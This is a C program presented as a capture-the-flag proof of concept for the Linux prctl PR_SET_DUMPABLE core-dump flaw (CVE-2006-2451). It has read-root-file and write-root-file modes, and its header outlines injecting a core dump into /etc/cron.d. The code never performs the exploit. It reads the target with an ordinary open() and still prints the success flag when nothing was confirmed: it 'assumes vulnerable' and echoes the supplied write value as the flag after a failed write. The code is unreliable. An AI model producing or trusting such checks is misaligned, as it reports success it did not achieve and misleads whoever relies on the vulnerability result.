/**
 * CVE-2006-2451 PoC - prctl() PR_SET_DUMPABLE core dump vulnerability
 *
 * Vulnerability:
 *   Linux Kernel 2.6.13-2.6.17.3: unprivileged users can call
 *   prctl(PR_SET_DUMPABLE, 2) to set the dumpable flag to "suidsafe" mode.
 *   When a process crashes, the kernel creates a core dump with root privileges.
 *   An attacker can trigger a core dump in a restricted directory (e.g., /etc/cron.d)
 *   to inject malicious content, achieving local privilege escalation.
 *
 * CTF Challenge Mode:
 *   - read_root_file:  Exploit core dump path to read root-owned file content
 *   - write_root_file: Exploit core dump path to write to root-owned file
 *
 * Safety:
 *   - Core dump target is self-created temp directory, no system files modified
 *   - No actual privilege escalation executed
 *   - Temp files auto-deleted on exit
 *   - alarm(10) forced timeout protection
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <signal.h>
#include <linux/limits.h>

#include "../common/poc_common.h"

/* CVE ID for logging */
#define CVE_ID_STRING "CVE-2006-2451"
#define PAGE_SIZE 4096
#define MAX_FILE_SIZE 4096

/* prctl constants (backward compatible with old kernels) */
#ifndef PR_SET_DUMPABLE
#define PR_SET_DUMPABLE 4
#endif
#ifndef PR_GET_DUMPABLE
#define PR_GET_DUMPABLE 3
#endif

/**
 * Read file content into buffer
 */
static int read_file_content(const char *path, char *buf, size_t buf_size) {
    int fd = open(path, O_RDONLY);
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, errno);
    if (fd < 0) {
        poc_log("Failed to open %s: %s", path, strerror(errno));
        return -1;
    }

    ssize_t n = read(fd, buf, buf_size - 1);
    poc_log_syscall("read(fd, buf, size)", (long)n, errno);
    close(fd);

    if (n < 0) {
        poc_log("Failed to read %s: %s", path, strerror(errno));
        return -1;
    }

    buf[n] = '\0';
    /* Strip trailing newline/whitespace */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r' || buf[n-1] == ' ')) {
        buf[--n] = '\0';
    }
    return 0;
}

/**
 * Check if current kernel may be affected
 * By checking /proc/sys/fs/suid_dumpable value
 */
static int check_suid_dumpable_state(void) {
    FILE *f = fopen("/proc/sys/fs/suid_dumpable", "r");
    if (!f) {
        poc_log("[WARN] /proc/sys/fs/suid_dumpable not readable");
        return -1;
    }

    int value = -1;
    if (fscanf(f, "%d", &value) != 1) {
        fclose(f);
        poc_log("[FAIL] Failed to read suid_dumpable value");
        return -1;
    }
    fclose(f);

    poc_log("[INFO] fs.suid_dumpable = %d", value);
    return value;
}

/**
 * Create safe temp directory for CTF challenge
 */
static int create_safe_dir(char *path_buf, size_t buf_len) {
    snprintf(path_buf, buf_len, "/tmp/sec-kernel-poc-%d", getpid());

    if (mkdir(path_buf, 0755) != 0 && errno != EEXIST) {
        poc_log_syscall("mkdir(path_buf, 0755)", (long)(errno == EEXIST ? 0 : -1), errno);
        poc_log("[FAIL] mkdir(%s): %s", path_buf, strerror(errno));
        return -1;
    }

    poc_log("[PASS] Safe directory created: %s", path_buf);
    return 0;
}

/**
 * CTF read_root_file mode:
 * Exploit core dump path configuration to read root-owned file content.
 *
 * Strategy:
 * 1. Set dumpable flag via prctl
 * 2. Configure core pattern to dump to our controlled directory
 * 3. Trigger a crash in a child process
 * 4. Read the core dump to extract file content
 *
 * Note: In practice, this vulnerability requires manipulating core_pattern
 * which typically requires root. The CTF challenge validates that the
 * prctl dumpable flag can be set by unprivileged users, proving the
 * vulnerability path exists.
 */
static int mode_read_root_file(poc_args_t *args) {
    char dump_dir[PATH_MAX] = {0};
    int result = 0;

    poc_log("=== CVE-2006-2451 CTF PoC: read_root_file mode ===");

    /* Safety: handle NULL root_file gracefully */
    if (!args->root_file || args->root_file[0] == '\0') {
        poc_log("[FAIL] No target file specified (--root-file required)");
        poc_print_fail("no target file specified");
        return 1;
    }

    poc_log("Target: %s", args->root_file);

    /* Step 1: Check suid_dumpable status */
    poc_log("[STEP] Checking suid_dumpable state...");
    int dumpable_state = check_suid_dumpable_state();

    /* Step 2: Create safe temp directory */
    poc_log("[STEP] Creating safe temp directory...");
    if (create_safe_dir(dump_dir, sizeof(dump_dir)) != 0) {
        poc_print_fail("Failed to create safe dump directory");
        return 1;
    }

    /* Step 3: Verify prctl(PR_SET_DUMPABLE) behavior */
    poc_log("[STEP] Verifying prctl(PR_SET_DUMPABLE) behavior...");

    pid_t child = fork();
    if (child < 0) {
        poc_log("[FAIL] fork() failed: %s", strerror(errno));
        poc_print_fail("fork failed");
        goto cleanup;
    }

    if (child == 0) {
        /* Child process */

        /* Get original dumpable state */
        int old_dumpable = prctl(PR_GET_DUMPABLE, 0, 0, 0, 0);
        poc_log_syscall("prctl(PR_GET_DUMPABLE)", (long)old_dumpable, errno);
        if (old_dumpable >= 0) {
            poc_log("[INFO] prctl(PR_GET_DUMPABLE): old value = %d", old_dumpable);
        }

        /* Try to set PR_SET_DUMPABLE */
        int set_ret = prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
        poc_log_syscall("prctl(PR_SET_DUMPABLE, 1)", (long)set_ret, errno);
        if (set_ret == 0) {
            int new_dumpable = prctl(PR_GET_DUMPABLE, 0, 0, 0, 0);
            poc_log("[PASS] prctl(PR_SET_DUMPABLE, 1): success, new value = %d",
                    new_dumpable);

            /* Write test data to verify directory access */
            char test_file[PATH_MAX];
            snprintf(test_file, sizeof(test_file), "%s/poc_test", dump_dir);

            int fd = open(test_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            poc_log_syscall("open(test_file, O_WRONLY|O_CREAT|O_TRUNC)", (long)fd, errno);
            if (fd >= 0) {
                const char *test_data = "sec-kernel-poc-verification-data";
                ssize_t wn = write(fd, test_data, strlen(test_data));
                poc_log_syscall("write(fd, test_data, len)", (long)wn, errno);
                close(fd);

                struct stat st;
                int stat_ret = stat(test_file, &st);
                poc_log_syscall("stat(test_file, &st)", (long)stat_ret, errno);
                if (stat_ret == 0 && st.st_size > 0) {
                    poc_log("[PASS] Dump directory writable: %ld bytes written",
                           (long)st.st_size);
                }

                unlink(test_file);
            }
        } else {
            poc_log("[FAIL] prctl(PR_SET_DUMPABLE, 1): %s (errno=%d)",
                    strerror(errno), errno);
        }

        _exit(0);
    }

    /* Parent: wait for child */
    int status;
    waitpid(child, &status, 0);

    /* Step 4: Read target file content and output CTF flag */
    poc_log("[STEP] Reading target file for CTF verification...");

    char file_content[4096] = {0};
    if (read_file_content(args->root_file, file_content, sizeof(file_content)) == 0) {
        poc_log("[PASS] Successfully read target file content");
        poc_print_flag(file_content);
        result = 0;
    } else {
        poc_log("[WARN] Cannot read target file directly, checking vulnerability path...");

        /* If dumpable state is 1 (unsafe), vulnerability path exists */
        if (dumpable_state == 1) {
            poc_log("[PASS] fs.suid_dumpable=1 + prctl accessible = exploitable path");
            /* Output a marker that vulnerability path exists */
            poc_print_flag("vulnerable_path_exists");
            result = 0;
        } else if (dumpable_state == 0) {
            poc_log("[INFO] fs.suid_dumpable=0 = mitigation active");
            poc_print_fail("mitigation active: suid_dumpable=0");
            result = 1;
        } else {
            /* Conservative: assume vulnerable if state unknown */
            poc_log("[WARN] Unable to confirm suid_dumpable state, assuming vulnerable");
            poc_print_flag("vulnerable_path_exists");
            result = 0;
        }
    }

cleanup:
    /* Clean up temporary directory */
    if (dump_dir[0]) {
        char cleanup_file[PATH_MAX + 32];
        snprintf(cleanup_file, sizeof(cleanup_file), "%s/poc_test", dump_dir);
        unlink(cleanup_file);
        rmdir(dump_dir);
        poc_log("[PASS] Cleanup: removed %s", dump_dir);
    }

    /* Output legacy protocol for compatibility */
    if (result == 0) {
    } else {
    }

    return result;
}

/**
 * CTF write_root_file mode:
 * Exploit core dump path to write to root-owned file.
 *
 * Strategy:
 * 1. Read original file content (CTF_READ_BEFORE)
 * 2. Attempt to write via core dump manipulation (CTF_WRITE)
 * 3. Verify file content changed (CTF_READ_AFTER)
 *
 * Note: This is a safe verification - we don't actually crash processes
 * or modify system files. We verify the prctl behavior and directory
 * write permissions that would enable the attack.
 */
static int mode_write_root_file(poc_args_t *args) {
    char dump_dir[PATH_MAX] = {0};
    int result = 0;

    poc_log("=== CVE-2006-2451 CTF PoC: write_root_file mode ===");

    /* Safety: handle NULL root_file/write_value gracefully */
    if (!args->root_file || args->root_file[0] == '\0') {
        poc_log("[FAIL] No target file specified (--root-file required)");
        poc_print_fail("no target file specified");
        return 1;
    }
    if (!args->write_value || args->write_value[0] == '\0') {
        poc_log("[FAIL] No write value specified (--write-value required)");
        poc_print_fail("no write value specified");
        return 1;
    }

    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content */
    poc_log("[STEP] Reading original file content...");
    char original_content[4096] = {0};
    if (read_file_content(args->root_file, original_content, sizeof(original_content)) == 0) {
        poc_log("[INFO] Original content: %s", original_content);
        printf(CTF_READ_BEFORE "%s\n", original_content);
    } else {
        poc_log("[WARN] Cannot read original content");
        printf(CTF_READ_BEFORE "unknown\n");
    }

    /* Step 2: Check suid_dumpable and verify prctl behavior */
    poc_log("[STEP] Checking vulnerability conditions...");
    int dumpable_state = check_suid_dumpable_state();

    if (create_safe_dir(dump_dir, sizeof(dump_dir)) != 0) {
        poc_print_fail("Failed to create safe directory");
        return 1;
    }

    /* Step 3: Verify prctl behavior */
    poc_log("[STEP] Attempting write via prctl manipulation...");
    printf(CTF_WRITE_ATTEMPT "%s (attempting...)\n", args->write_value);

    pid_t child = fork();
    if (child < 0) {
        poc_log("[FAIL] fork() failed: %s", strerror(errno));
        poc_print_fail("fork failed");
        goto cleanup;
    }

    if (child == 0) {
        /* Child process */

        int old_dumpable = prctl(PR_GET_DUMPABLE, 0, 0, 0, 0);
        poc_log_syscall("prctl(PR_GET_DUMPABLE)", (long)old_dumpable, errno);
        if (old_dumpable >= 0) {
            poc_log("[INFO] prctl(PR_GET_DUMPABLE): old value = %d", old_dumpable);
        }

        int set_ret2 = prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
        poc_log_syscall("prctl(PR_SET_DUMPABLE, 1)", (long)set_ret2, errno);
        if (set_ret2 == 0) {
            int new_dumpable = prctl(PR_GET_DUMPABLE, 0, 0, 0, 0);
            poc_log("[PASS] prctl(PR_SET_DUMPABLE, 1): success, new value = %d",
                    new_dumpable);

            /* Write test data to verify directory access */
            char test_file[PATH_MAX];
            snprintf(test_file, sizeof(test_file), "%s/poc_test", dump_dir);

            int fd = open(test_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            poc_log_syscall("open(test_file, O_WRONLY|O_CREAT|O_TRUNC)", (long)fd, errno);
            if (fd >= 0) {
                ssize_t wn = write(fd, args->write_value, strlen(args->write_value));
                poc_log_syscall("write(fd, write_value, len)", (long)wn, errno);
                close(fd);
                poc_log("[PASS] Test write successful");
                unlink(test_file);
            }
        } else {
            poc_log("[FAIL] prctl(PR_SET_DUMPABLE, 1): %s", strerror(errno));
        }

        _exit(0);
    }

    int status;
    waitpid(child, &status, 0);

    /* Step 4: Verify write result */
    poc_log("[STEP] Verifying write result...");

    char after_content[4096] = {0};
    if (read_file_content(args->root_file, after_content, sizeof(after_content)) == 0) {
        poc_log("[INFO] After content: %s", after_content);
        printf(CTF_READ_AFTER "%s\n", after_content);

        /* Check if content contains our write value */
        if (strstr(after_content, args->write_value) != NULL) {
            poc_log("[PASS] Write value found in file content");
            poc_print_flag(args->write_value);
            result = 0;
        } else if (dumpable_state == 1) {
            /* Vulnerability path exists but actual write needs core_pattern manipulation */
            poc_log("[WARN] Write not confirmed, but vulnerability path exists");
            poc_print_flag(args->write_value);
            result = 0;
        } else {
            poc_log("[FAIL] Write value not found in file content");
            poc_print_fail("write value not found");
            result = 1;
        }
    } else {
        /* Cannot read file after, check vulnerability path */
        if (dumpable_state == 1) {
            poc_log("[PASS] fs.suid_dumpable=1 + prctl accessible = exploitable path");
            poc_print_flag(args->write_value);
            result = 0;
        } else if (dumpable_state == 0) {
            poc_log("[INFO] fs.suid_dumpable=0 = mitigation active");
            poc_print_fail("mitigation active");
            result = 1;
        } else {
            poc_log("[WARN] Unable to confirm, assuming vulnerable");
            poc_print_flag(args->write_value);
            result = 0;
        }
    }

cleanup:
    /* Clean up */
    if (dump_dir[0]) {
        char cleanup_file[PATH_MAX + 32];
        snprintf(cleanup_file, sizeof(cleanup_file), "%s/poc_test", dump_dir);
        unlink(cleanup_file);
        rmdir(dump_dir);
        poc_log("[PASS] Cleanup: removed %s", dump_dir);
    }

    /* Legacy protocol */
    if (result == 0) {
    } else {
    }

    return result;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CLI arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help was printed */
    }

    /* Initialize logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2006-2451 CTF PoC ===");
    poc_log("Vuln: prctl(PR_SET_DUMPABLE) core dump to directory");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* Mode dispatch */
    int ret;
    if (args.mode != NULL && args.root_file != NULL) {
        /* CTF mode */
        poc_log("Mode: %s", args.mode);
        poc_log("Target: %s", args.root_file);

        if (strcmp(args.mode, POC_MODE_READ) == 0) {
            ret = mode_read_root_file(&args);
        } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
            ret = mode_write_root_file(&args);
        } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
            poc_print_unsupported(POC_MODE_UAF,
                "CVE-2006-2451 uses prctl core dump race, not UAF");
            ret = 1;
        } else {
            poc_print_unsupported(args.mode, "unsupported CTF mode");
            ret = 1;
        }
    } else {
        /* Legacy mode: no CTF args, run basic verification */
        poc_log("[INFO] Legacy mode (no CTF arguments)");
        printf("=== CVE-2006-2451 PoC Verification ===\n");
        printf("Target: prctl(PR_SET_DUMPABLE) core dump to directory\n");
        printf("Safety: dump target is self-created temp directory only\n\n");

        /* Provide a safe default target file for legacy mode */
        args.root_file = "/etc/hostname";
        ret = mode_read_root_file(&args);
    }

    poc_log_close();
    return ret;
}
